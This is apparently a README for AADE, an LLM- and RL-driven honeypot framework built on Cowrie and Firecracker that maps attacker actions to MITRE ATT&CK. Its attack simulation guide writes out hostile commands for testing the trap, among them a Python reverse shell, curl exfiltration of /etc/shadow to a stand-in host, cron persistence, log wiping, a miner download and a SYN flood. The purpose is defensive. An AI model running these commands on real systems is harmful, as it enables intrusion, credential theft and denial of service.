# AADE — Autonomous Adaptive Deception Environment

> A next-generation honeypot framework that **eliminates fingerprinting** through LLM-powered human-behavior synthesis, reinforcement-learning-driven interaction scaling, and live MicroVM migration — all mapped in real time to the MITRE ATT&CK framework.

---

## Table of Contents

1. [Setup & Running the System](#1-setup--running-the-system)
2. [Attack Simulation Guide (15 Scenarios)](#2-attack-simulation-guide-15-scenarios)
3. [What is AADE?](#3-what-is-aade)
4. [The Problem It Solves](#4-the-problem-it-solves)
5. [System Architecture](#5-system-architecture)
6. [Components](#6-components)
7. [Tech Stack](#7-tech-stack)
8. [Key Innovations](#8-key-innovations)

---

## 1. Setup & Running the System

> **Platform requirement:** This framework relies on Linux-exclusive features — KVM virtualisation, AF_VSOCK, and iptables. It will not run on macOS or Windows. Recommended: Kali Linux (bare-metal or VMware with nested virtualisation enabled).

Move this entire directory (`aade`) to your Linux host, then follow the steps below.

### 1. Execute the Master Installer

Run the master installation script to install all dependencies, download tools, and prepare Firecracker and Cowrie instances.

```bash
chmod +x master_install.sh
./master_install.sh
```

### 2. Generate the Gold Image (Phase 2)

Generate a rootfs filled with fake data that tricks the attacker into believing it's a real machine.

```bash
# Assuming you mounted an ext4 filesystem to /mnt/gold
sudo python3 generate_noise.py
```

### 3. Setup Honeywall (Phase 4)

This prevents malware and attacks launched inside the honeypot from escaping into the real network.

```bash
sudo chmod +x honeywall_setup.sh
sudo ./honeywall_setup.sh
```

### 4. Running the System

Once everything is downloaded and the gold image is built and sealed, launch the ecosystem in separate terminals:

**Terminal 1:** Start the vsock listener (must run before Firecracker so the MicroVM can connect on boot)

```bash
python3 vsock_listener.py
```

**Terminal 2:** Start the C2 mitmproxy sinkhole

```bash
mitmproxy -p 8080 -s c2_sinkhole.py --ssl-insecure
```

**Terminal 3:** Launch the Cowrie honeypot (using the virtual environment created by the installer)

```bash
#Starting for the First Time
cd ~/Desktop/AADE-HoneyPot/cowrie
source cowrie-env/bin/activate
pip install -e .
cowrie start
```
```bash
#Starting Again
# 1. Enter the Cowrie directory
cd ~/Desktop/AADE-HoneyPot/cowrie
# 2. Activate the virtual environment
source cowrie-env/bin/activate
# 3. Start the service
cowrie start

```

**Terminal 4:** Launch the Dashboard

```bash
python3 dashboard.py
# Dashboard will be available at http://localhost:5000
```

**Terminal 5:** Launch the Orchestrator

```bash
python3 orchestrator.py
```

When the attacker connects to Cowrie and executes a suspicious command, the **Orchestrator** triggers live-migration from Cowrie into an active Firecracker MicroVM. Any actions inside the MicroVM are piped out to the host via **AF_VSOCK**. The **Dashboard** actively polls the `.jsonl` logs to show you what's happening live using MITRE ATT&CK mappings.

### 5. Starting the Attack Simulation

To begin an attack simulation, open a **separate terminal** and connect to the honeypot's entry point via SSH. This is where you will execute the commands listed in the **Attack Simulation Guide** below.

```bash
# Connect to the AADE entry-point (Cowrie)
sudo ssh root@localhost -p 2222

# Password: any password will work (defaults to accepting all credentials)
```

Once connected, you are inside the "Primary Trap." Your actions here will be monitored and visualized on the dashboard in real-time.

---

## 2. Attack Simulation Guide (15 Scenarios)

This guide provides a comprehensive walkthrough for testing the **AADE's Adaptive Logic**. Attacks are categorized by MITRE levels. **Bot-like** attacks are contained within the low-interaction Honeypot, while **Interactive/Advanced** behaviors trigger a transparent shift to a high-interaction **Firecracker MicroVM**.

---

### 🛠️ Phase A: Discovery & Staging (Bot-Heavy / Tier 1)
*Initial capture and environment mapping.*

---

**(01)-(System Reconnaissance)-(L1)**
```bash
whoami; id; uname -a
```
**Description:** The "First Contact" chain used to verify user privileges and system architecture. This allows the attacker to determine if they are root and identify the kernel version for targeted local exploits.
**Reaction:** AADE provides standard fake responses, logging the IP and command sequence while maintaining a lightweight footprint.
**Trigger:** **Bot Environment** (Cowrie Low-Interaction).

---

**(02)-(Network Enumeration)-(L1)**
```bash
netstat -antp; route -n
```
**Description:** An attempt to map the internal network topology. Attackers look for active connections, open internal services, and routing paths to other subnets for lateral movement.
**Reaction:** AADE serves a believable fake network interface and routing table. The TTP Mapper flags this as **T1016 (System Network Configuration Discovery)**.
**Trigger:** **Bot Environment** (Cowrie Low-Interaction).

---

**(03)-(Service & OS Fingerprinting)-(L1)**
```bash
cat /etc/os-release; ls /etc/init.d
```
**Description:** Probing for the exact Linux distribution (e.g., Debian, Alpine) and running services. Identifying the init system (SystemD vs SystemV) helps the attacker tailor their persistence scripts.
**Reaction:** Provides a fake OS release file. High-frequency automated probes at this stage are typically filtered as low-priority bot noise.
**Trigger:** **Bot Environment** (Cowrie Low-Interaction).

---

**(04)-(Brute Force Attack)-(L1)**
```bash
hydra -l admin -P passlist.txt ssh://127.0.0.1
```
**Description:** Automated credential guessing attempt against the SSH service. This is the most common entry vector for botnets looking to expand their footprint.
**Reaction:** Cowrie absorbs the hits and provides "slow-auth" responses to waste the attacker's resources while fingerprinting the brute-force tool.
**Trigger:** **Bot Environment** (Cowrie Low-Interaction).

---

**(05)-(Credential Preparation)-(L2)**
```bash
cat /etc/passwd; find / -name "*.history"
```
**Description:** Searching for user accounts and plaintext secrets inadvertently stored in Bash history or configuration backups. This is a critical step for credential harvesting and privilege escalation.
**Reaction:** Logged as **T1003 (OS Credential Dumping)**. The RL agent increases the "Adversary Risk Score" based on the depth of the recursive search.
**Trigger:** **Bot Environment** (Cowrie Low-Interaction).

---

### ⚡ Phase B: Interactive Escalation (Human-Centric / Tier 2)
*High-risk behaviors that indicate manual control.*

---

**(06)-(External Payloading)-(L2)**
```bash
wget http://example.com/malware.sh -O /tmp/malware.sh
```
**Description:** Attempting to download external malicious tools or second-stage payloads. This marks a transition from native recon to introducing custom attacker logic.
**Reaction:** The file is virtually cached. This behavior acts as a primary trigger, moving the session to the threshold of a High-Interaction shift.
**Trigger:** **Bot Environment** (Cowrie Low-Interaction).

---

**(07)-(SQL Injection Probing)-(L2)**
```bash
sqlmap --url="http://127.0.0.1/api/v1/user?id=1" --batch
```
**Description:** Using automated tools like `sqlmap` to probe local or networked web services for database vulnerabilities. This indicates an attempt to pivot from the shell to the application layer.
**Reaction:** AADE presents a fake "vulnerable" API response to the tool, logging the specific payloads and database headers the attacker is attempting to blind-inject.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(08)-(Sudo Privilege Probe)-(L2)**
```bash
sudo -l
```
**Description:** Checking for password-less sudo permissions or misconfigured bin rights. This is a manual human procedure used to find a quick path to root sovereignty.
**Reaction:** The Orchestrator intercepts this high-intent command and prepares the **Firecracker MicroVM** to give the attacker a "real" (but sealed) escalation path.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(09)-(Automated Persistence)-(L3)**
```bash
(crontab -l ; echo "*/15 * * * * /tmp/malware.sh") | crontab -
```
**Description:** Installing a persistent backdoor via the system scheduler (Cron). This ensures the attacker gains access even if the honeypot session is reset or the server reboots.
**Reaction:** Classified as **T1053.003 (Scheduled Task/Job)**. The system transitions the attacker to a real cron-capable environment to observe their persistent payload execution.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(10)-(Cross Site Scripting (XSS))-(L3)**
```bash
curl -d "name=<script>alert('pwned')</script>" http://127.0.0.1/feedback
```
**Description:** Injecting malicious scripts into local web feedback forms or API endpoints. Attackers use this to test for reflected XSS vulnerabilities that could be used for session hijacking.
**Reaction:** The VSOCK listener captures the raw payload. The dashboard maps this to **T1189 (Drive-by Compromise)** and highlights the script-tag injection.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(11)-(Anti-Forensics / Trace Removal)-(L3)**
```bash
rm -rf /var/log/syslog; unset HISTFILE
```
**Description:** Deleting system logs and disabling command history tracking. This is a classic "Covering Tracks" technique used by skilled human operators to evade incident response teams.
**Reaction:** The system presents a real filesystem where the attacker believe they have deleted the logs, while AADE continues logging every keystroke out-of-band via VSOCK.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(12)-(Process Camouflage Monitor)-(L3)**
```bash
ps aux | grep -v "malware"
```
**Description:** Searching the process tree while filtering out their own malware. Attackers use this to monitor for security agents or competing hackers without exposing their own presence.
**Reaction:** The MicroVM provides a real High-Interaction process tree. The AF_VSOCK listener logs this stealthy self-audit as an indicator of advanced evasion.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(13)-(Direct Kernel Callback / Reverse Shell)-(L4)**
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
**Description:** Establishing a Python-based interactive reverse shell. This sends a command-line stream back to the attacker's server, bypassing simple inbound firewall blocks.
**Reaction:** The MicroVM allows the connection, but the **Honeywall** routes it to our **C2 Sinkhole**, allowing us to record the attacker's "Remote Control" session in total isolation.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

### 💀 Phase C: Deep Deception & Impact (APT / Tier 3)
*Simulating the final stages of a high-value breach.*

---

**(14)-(Credential Persistence / SSH Keys)-(L4)**
```bash
ssh-keygen -t rsa -b 4096; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```
**Description:** Generating and installing an SSH Public Key for permanent, password-less backdoor access. This indicates an intent to use the server as a long-term staging post.
**Reaction:** The LLM Synthesizer injects these keys into the "Real" home directory of the MicroVM, validating the attacker's TTPs while we extract the public key for forensic tracking.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(15)-(Ransomware Deployment Flow)-(L4)**
```bash
gpg --symmetric --cipher-algo AES256 important_data.tar
```
**Description:** Encrypting high-value archives using AES-256 via GPG. This simulates the impact phase where attackers hold sensitive corporate data hostage for ransom.
**Reaction:** AADE populates the image with LLM-generated fake data (SQL backups, payroll PDFs). The attacker encrypts these **fake** artifacts, confirming the "Impact" tactic on the dashboard.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(16)-(DDoS Flood Attack)-(L4)**
```bash
hping3 -S --flood -V 10.0.0.5
```
**Description:** Using the compromised host to launch a high-volume SYN flood against an internal or external target. This turns the honeypot into a "zombie" in a larger botnet.
**Reaction:** The **Honeywall** detects the abnormal outbound packet frequency and rate-limits the flow to 1Kbps to prevent real damage, while logging the target IP for downstream alerting.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(17)-(Resource Mining / Hijacking)-(L4)**
```bash
curl -LO http://miner.pool/xmrig; chmod +x xmrig; ./xmrig -o pool.com &
```
**Description:** Downloading and deploying a cryptocurrency miner (XMRig) to hijack system CPU resources for illicit profit.
**Reaction:** The MicroVM's CPU is hardware-throttled to 10% to protect the host, while the dashboard triggers a "Resource Hijacking" alert with the full mining pool configuration.
**Trigger:** **Human Environment** (Adaptive Firecracker Shift).

---

**(18)-(Kernel Escape Discovery)-(L5)**
```bash
sysctl -w kernel.panic=1; cat /proc/kcore
```
**Description:** Probing kernel memory and forcing system crashes to identify virtualization escapes. This is an extremely invasive technique used only by high-level APT actors.
**Reaction:** The MicroVM's real kernel provides valid (but isolated) responses. KVM isolation ensures these "Escape" attempts have zero impact on the host operating system.
**Trigger:** **Human Environment** (Deep High-Interaction).

---

**(19)-(Covert Exfiltration & Network Pivot)-(L5)**
```bash
curl --data-binary @/etc/shadow http://exfil.server/upload
```
**Description:** Exfiltrating sensitive system files (the password shadow file) via a binary HTTP POST stream. This is a final attempt to harvest passwords for lateral enterprise movement.
**Reaction:** The C2 Sinkhole captures the raw binary exfiltration stream, providing us with a copy of the attacker's protocol and the specific destination IOC.
**Trigger:** **Human Environment** (Deep High-Interaction).

---

**(20)-(Man-in-the-Middle (MITM) Intercept)-(L5)**
```bash
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1
```
**Description:** Attempting an ARP spoofing attack to intercept traffic between local hosts. This indicates the attacker is attempting to escalate from local access to full network-wide interception.
**Reaction:** The **Honeywall** detects the unsolicited ARP replies. It allows the attacker to "see" fake traffic generated by the **LLM Synthesizer**, poisoning their perception of the internal network.
**Trigger:** **Human Environment** (Deep High-Interaction).

---

## 3. Dashboard Components Guide

The AADE Dashboard provides real-time visibility into attacker activity across 15+ specialized components:

### Top Stats Row

| Component | Description |
|-----------|-------------|
| **TOTAL ATTACKS** | Total number of commands/actions executed by attackers |
| **ACTIVE SESSIONS** | Attackers currently connected (active within last 15 minutes) |
| **UNIQUE IPs** | Count of distinct attacker source IP addresses |
| **GHOST RESPONSES** | Times the LLM synthesized fake responses to deceive attackers |

### Core Telemetry Row

| Component | Description |
|-----------|-------------|
| **SYSTEM VITALITY** | Host health metrics: CPU %, RAM usage, uptime, sensor load status |
| **THREAT VELOCITY** | Attack intensity measured in events per 15-minute window |
| **ADVERSARY INTENT** | Probability percentage that attackers are humans vs automated bots |
| **DECEPTION FIDELITY** | Trust coefficient indicating how "real" the honeypot appears |

### Main Analysis Panels

| Component | Description |
|-----------|-------------|
| **LIVE SESSION COMMAND FLOW** | Real-time command stream with high-visibility phase badges and JetBrains Mono typography for maximum legibility of active terminal I/O. |
| **ATTACK TIMELINE** | 24-hour visualization of attack frequency patterns and temporal threat distribution. |
| **VECTOR DISTRIBUTION** | Volume analysis of MITRE ATT&CK tactics observed during active engagements. |
| **TOP MITRE DETECTION VECTORS** | Multi-dimensional radar visualization of threat intensity across primary attack stages. |
| **MITRE TECHNIQUE MATRIX** | Granular mapping of specific adversarial techniques to the global ATT&CK taxonomy. |
| **ACTIVE ADVERSARY PROFILES** | Dynamic intelligence cards classifying attackers from 'Automated Bots' to 'Skilled Human Operators' based on behavioral heuristics. |
| **ACTIVE SURFACE** | Real-time monitoring of exposed honeypot service ports and adaptive listener states. |
| **TACTICAL RESPONSE STRATEGY** | Operational status of the Reinforcement Learning engine and current defensive posture. |
| **ATTACK SESSION TIMELINE** | Dense forensic narrative: `[UTC Time] — Executed Command — MITRE TTP`. Optimized for professional analysis with bold hierarchical indicators and zero horizontal noise. |

---

## 4. What is AADE?

AADE is a **fully autonomous adaptive deception platform** that traps and studies attackers without ever revealing it's a honeypot. Unlike static honeypots that experienced attackers can fingerprint in seconds, AADE:

- Starts with a low-interaction SSH trap (**Cowrie**) to capture initial behavior
- On detecting serious intent, **live-migrates the session into a Firecracker MicroVM** — a real kernel running a fake-but-convincing filesystem
- Uses an **LLM to synthesize human-like shell history, cron jobs, and user artifacts** so the attacker believes they've compromised a real machine
- Uses **reinforcement learning** to adapt how much it reveals vs. how long it keeps the attacker engaged
- Silently **sinkholes all outbound C2 traffic** via mitmproxy, letting you observe the attacker's command-and-control infrastructure
- Maps every attacker action to **MITRE ATT&CK TTPs** live on a dashboard

---

## . The Problem It Solves

Traditional honeypots are detected trivially:
- Static filesystem with no real user history → fingerprinted immediately
- No real kernel → `uname`, `/proc`, timing attacks reveal virtualization
- No real network responses → C2 beacons fail silently
- No adaptation → once an attacker discovers it's fake, all intelligence is lost

AADE addresses all four. The attacker gets a live kernel, a realistic filesystem generated by an LLM, real network responses (sinkholes included), and the system adapts its deception depth using RL based on attacker aggression level.

---

## . System Architecture

```
Attacker
   │
   ▼
[Cowrie SSH Honeypot]  ←── low-interaction trap, logs keystrokes
   │
   │  suspicious command detected
   ▼
[Orchestrator]  ←── decides: escalate to MicroVM?
   │
   ├──► [LLM Synthesizer]  ──► generates fake user artifacts into gold image
   │
   ├──► [Firecracker MicroVM]  ──► live kernel, sealed rootfs, real shell
   │         │
   │         │  all I/O piped via AF_VSOCK (port 40)
   │         ▼
   │    [VSOCK Listener]  ──► host receives every command silently
   │
   ├──► [C2 Sinkhole]  ──► mitmproxy intercepts all outbound C2 traffic
   │
   ├──► [RL Orchestrator]  ──► Q-learning adapts engagement strategy
   │
   ├──► [TTP Mapper]  ──► maps actions to MITRE ATT&CK
   │
   └──► [Logger Agent]  ──► structured .jsonl event log
            │
            ▼
      [Dashboard]  ──► live Flask UI with ATT&CK heatmap
```

### Phase Summary

| Phase | What Happens |
|-------|--------------|
| **Phase 1 — Installation** | `master_install.sh` installs Firecracker, Cowrie, mitmproxy, and Python dependencies |
| **Phase 2 — Gold Image** | `generate_noise.py` seeds the MicroVM rootfs with LLM-generated fake user history, files, and cron jobs |
| **Phase 3 — Cowrie Trap** | Attacker connects via SSH; Cowrie logs all commands and session data |
| **Phase 4 — Honeywall** | `iptables` rules prevent any real malware or attacks from escaping the MicroVM into the host network |
| **Phase 5 — Live Migration** | Orchestrator detects escalation trigger, boots Firecracker MicroVM from sealed gold image |
| **Phase 6 — Silent Observation** | VSOCK listener receives all in-VM activity out-of-band; C2 sinkhole captures beacon traffic |
| **Phase 7 — Intelligence** | TTP Mapper classifies behavior; Dashboard renders ATT&CK coverage live |

---

## 7. Components

| File | Role |
|------|------|
| `orchestrator.py` | Central controller — watches Cowrie logs, decides when to trigger MicroVM migration, coordinates all subsystems |
| `rl_orchestrator.py` | Reinforcement learning layer — Q-learning agent that adapts deception depth (reveal more vs. stay quiet) based on attacker aggression signals |
| `llm_synthesizer.py` | Calls an LLM to generate realistic shell history, `.bash_history`, fake SSH keys, cron jobs, and user files injected into the gold image |
| `vsock_listener.py` | Out-of-band host-side listener on AF_VSOCK port 40; receives all MicroVM shell I/O without touching the attacker's network path |
| `c2_sinkhole.py` | mitmproxy addon that intercepts and logs all outbound C2 beacon traffic from inside the MicroVM — DNS, HTTP, raw TCP |
| `ttp_mapper.py` | Maps observed commands and behaviors to MITRE ATT&CK Tactic/Technique IDs (e.g., T1059.004 for Unix shell execution) |
| `logger_agent.py` | Structured event logger — writes timestamped `.jsonl` records for every attacker action, migration event, and TTP match |
| `dashboard.py` | Flask web dashboard (port 5000) — polls `.jsonl` logs and renders live ATT&CK heatmap, session timeline, and C2 intercept feed |
| `generate_noise.py` | Seeds the Firecracker rootfs (mounted ext4 at `/mnt/gold`) with convincing fake user artifacts generated by the LLM |
| `honeywall_setup.sh` | Configures iptables rules to isolate the MicroVM network — blocks egress to real IPs while allowing sinkhole interception |
| `master_install.sh` | One-shot installer: downloads Firecracker binary, clones and sets up Cowrie, installs all Python and system dependencies |
| `templates/` | Jinja2 HTML templates for the Flask dashboard UI |
| `tests/` | Test suite for individual components |

---

## 8. Tech Stack

| Tool / Library | Purpose |
|----------------|---------|
| **Firecracker** | KVM-based MicroVM hypervisor — provides a real Linux kernel for the deception environment |
| **Cowrie** | SSH/Telnet honeypot for initial low-interaction capture |
| **mitmproxy** | Transparent proxy for C2 traffic sinkholing and inspection |
| **AF_VSOCK** | Linux virtual socket for out-of-band MicroVM ↔ host communication |
| **iptables** | Network isolation (honeywall) to contain MicroVM traffic |
| **Flask** | Dashboard web server |
| **LLM API** | Human behavior synthesis — generates realistic fake filesystem artifacts |
| **Q-Learning (RL)** | Adaptive engagement strategy — decides deception depth at runtime |
| **MITRE ATT&CK** | Threat intelligence framework for classifying observed attacker TTPs |
| **Python 3** | Core language for all orchestration, logging, synthesis, and mapping |
| **Shell / Bash** | Installation and setup scripts |

---

## 9. Key Innovations

**Live MicroVM Migration**
When Cowrie detects a serious attacker (e.g., they run `wget`, `curl`, or attempt persistence), the orchestrator transparently migrates the session into a real Firecracker MicroVM. The attacker never notices — they think they just got a shell on a real box.

**LLM-Powered Human Behavior Synthesis**
Instead of an obviously empty filesystem, `llm_synthesizer.py` populates the gold image with contextually coherent fake data — plausible `.bash_history`, SSH key names, cron jobs, home directory structure — making fingerprinting far harder.

**RL-Adaptive Engagement**
`rl_orchestrator.py` uses Q-learning to optimize a tradeoff: reveal more of the "system" to keep the attacker engaged longer vs. stay quiet to avoid detection. The reward signal is time-on-target and intelligence gathered.

**Out-of-Band Observation via VSOCK**
All MicroVM I/O is mirrored to the host via AF_VSOCK — a channel the attacker cannot see or interfere with. No SSH tunneling, no network traffic, no fingerprinting surface.

**C2 Sinkhole**
The mitmproxy-based C2 sinkhole intercepts all outbound traffic from the MicroVM. If the attacker's malware beacons home, the sinkhole logs the C2 address, payload, and protocol while returning convincing fake responses to keep the malware alive longer.

**Real-Time MITRE ATT&CK Mapping**
Every command logged by Cowrie or the VSOCK listener is classified by `ttp_mapper.py` into ATT&CK Tactic/Technique pairs and rendered live on the dashboard.

---

*AADE — built to let attackers think they've won, while you watch every move.*
